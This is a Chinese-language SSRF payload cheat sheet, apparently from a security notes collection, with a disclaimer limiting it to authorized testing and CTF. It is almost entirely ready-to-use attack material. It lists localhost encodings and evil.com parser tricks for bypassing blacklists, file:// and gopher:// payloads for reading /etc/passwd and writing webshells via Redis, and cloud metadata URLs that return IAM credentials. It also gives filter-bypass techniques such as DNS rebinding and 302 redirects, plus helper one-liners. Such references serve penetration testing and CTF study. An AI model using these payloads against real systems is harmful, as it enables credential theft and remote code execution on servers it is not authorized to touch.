# SSRF · Payload

> ⚠️ 仅用于**合法授权的安全测试**与 **CTF 赛题环境**。原理见 [原理笔记.md](原理笔记.md)。

## 第 1 步：确认请求真的发出去了

| 手段 | Payload | 说明 |
| --- | --- | --- |
| 打自己的服务器 | `http://<你的公网IP>:8000/` | 最直接，看访问日志 |
| DNSLog 验证 | `http://任意.dnslog.cn` | 有 DNS 记录 = 确实发起了请求 |
| 延迟判断（盲打） | `http://10.255.255.1:80/` | 不可达地址会卡住，响应变慢说明有请求 |
| 内网存活探测 | `http://127.0.0.1:22/` vs `http://127.0.0.1:9999/` | 端口开放与关闭的响应/耗时不同 |

## localhost / 内网地址的变形（绕黑名单）

```
http://127.0.0.1
http://127.1
http://127.0.0.01
http://0.0.0.0
http://0
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://2130706433          # 127.0.0.1 的十进制
http://0177.0.0.1          # 八进制
http://0x7f.0.0.1          # 十六进制
http://127.0.0.1.nip.io    # 域名解析到 127.0.0.1
http://localtest.me
http://spoofed.burpcollaborator.net
http://127.0.0.1:80@evil.com     # 解析差异：有些库取 @ 后面的主机
http://evil.com#@127.0.0.1       # 另一种解析差异
http://127.0.0.1%00.evil.com
http://①②⑦.⓪.⓪.①                # 特殊字符归一化问题
```

## 协议利用

| 目的 | Payload |
| --- | --- |
| 读本地文件 | `file:///etc/passwd` |
| 读 Windows 文件 | `file:///C:/Windows/win.ini` |
| 端口探测 | `dict://127.0.0.1:6379/info` |
| Gopher 打 Redis（写 webshell） | `gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...`（用脚本生成，别手写） |
| Gopher 打 Redis（写计划任务） | 同理，构造 `CONFIG SET dir` + `SET` + `SAVE` |
| Gopher 打 MySQL | 需要抓取真实握手包再改写用户名 |
| Gopher 打 FastCGI | 构造 PHP-FPM 请求，直接执行 PHP |
| 读文件（PHP 环境） | `php://filter/convert.base64-encode/resource=/etc/passwd` |

## 云元数据（高价值）

| 平台 | Payload |
| --- | --- |
| AWS 角色名 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| AWS 凭据 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<角色名>` |
| AWS 用户数据 | `http://169.254.169.254/latest/user-data` |
| 阿里云 | `http://100.100.100.200/latest/meta-data/` |
| 腾讯云 | `http://metadata.tencentyun.com/latest/meta-data/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`（需 `Metadata-Flavor: Google` 头） |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01`（需 `Metadata: true` 头） |

## 绕过防护的套路

| 防护 | 绕过 |
| --- | --- |
| 只校验一次 URL | 自己的服务器返回 **302 跳转**到内网地址 |
| 只校验第一次解析的 IP | **DNS Rebinding**（域名第一次解析到公网 IP，第二次到 127.0.0.1） |
| 域名白名单 | 找白名单域名上的**开放跳转**接口 |
| 只拦 `127.0.0.1` 字符串 | 用上面的变形地址 |
| 只拦 http/https 以外协议 | 302 跳到 `file://`、`gopher://` |
| 长度限制 | 用短域名、`nip.io` 之类 |
| 拦 `@` | 用十六进制 IP |

## 常用配套

```bash
# 起一个接收访问的服务器，观察 SSRF 是否打过来
python -m http.server 8000

# 起一个会返回 302 的服务器（用 Flask 最简单）
python -c "from flask import Flask,redirect; a=Flask(__name__); a.route('/')(lambda: redirect('http://127.0.0.1:6379')); a.run(host='0.0.0.0',port=8000)"

# gopher payload 生成（示意：把裸 TCP 数据 URL 编码）
python -c "import urllib.parse,sys; print('gopher://127.0.0.1:6379/_'+urllib.parse.quote(sys.stdin.read()))" < redis_cmd.txt
```
